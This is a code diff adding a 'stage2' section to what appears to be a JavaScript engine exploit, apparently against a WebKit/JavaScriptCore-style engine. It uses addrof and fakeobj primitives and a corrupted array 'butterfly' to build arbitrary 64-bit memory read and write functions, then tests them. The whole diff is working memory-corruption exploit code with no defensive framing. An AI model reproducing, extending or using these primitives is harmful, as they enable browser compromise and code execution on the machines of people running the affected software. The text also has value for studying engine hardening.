@@ -515,6 +515,109 @@ for (var i = 0; i < 1000; ++i) {
     }
     jscell_header = results[0];
     print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+      
+    var stage2 = {
+        addrof: function(obj) {
+            return addrof(obj)
+        },
+
+        fakeobj: function(addr) {
+            return fakeobj(addr)
+        },
+
+        write64: function(where, what) {
+            hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = this.fakeobj(qwordAsFloat(what));
+        },
+
+        read64: function(where,offset) {
+            //var reset = hax[1];
+            if(offset) {
+                offset *= 8
+                return this.read64(where+offset);
+            }
+            hax[1] = qwordAsFloat(where + 0x10);
+            var res = this.addrof(victim1.prop);
+            //hax[1] = reset;
+            //victim1.prop = shared_butterfly;
+            return res;
+        },
+        readInt64: function(where) {
+            //var reset = hax[1];
+            hax[1] = qwordAsFloat(where + 0x10);
+            var res = this.addrof(victim1.prop);
+            //hax[1] = reset;
+            //victim1.prop = shared_butterfly;
+            return new Int64(res);
+        },
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write64(Add(addr, 2 * i), ints[i]);
+        },
+        
+        read(addr, length) {
+            var a = new Array(length);
+            var i;
+            var v;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = new Int64(this.read64(addr + i)).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = new Int64(this.read64(addr + i)).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+
+        },
+
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            port.postMessage(hex1(x.a))
+            if (hex1(x.a) != 0x1337) {
+                print('stage2 addrof/fakeobj does not work');
+            }
+
+            var val = 0x42424242;
+            //this.write64(0x4141414141,0x999999999)
+            //this.read64(0x999999)
+            this.write64(shared_butterfly - 8, 0x42424242);
+            print(hex1(floatAsQword(unboxed1[1])))
+            if (qwordAsFloat(val) != unboxed1[1]) {
+                print('stage2 write does not work');
+            }
+
+            if (this.read64(shared_butterfly + 8) != 0x42424242) {
+                print('stage2 read does not work');
+            }
+        },
+
+        clear: function() {
+            outer = null;
+            hax = null;
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed1[i] = null;
+            boxed1 = null
+            unboxed1 = null
+        },
+    };
+    print("testing arbitrary r/w capabilities")
+    var tester = {a: 0x1337};
+    var adddr = addrof(tester);
+    var val = stage2.read64(adddr + 8);
+    print("val should be 0x1337 if not it failed" + val);
     
     /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
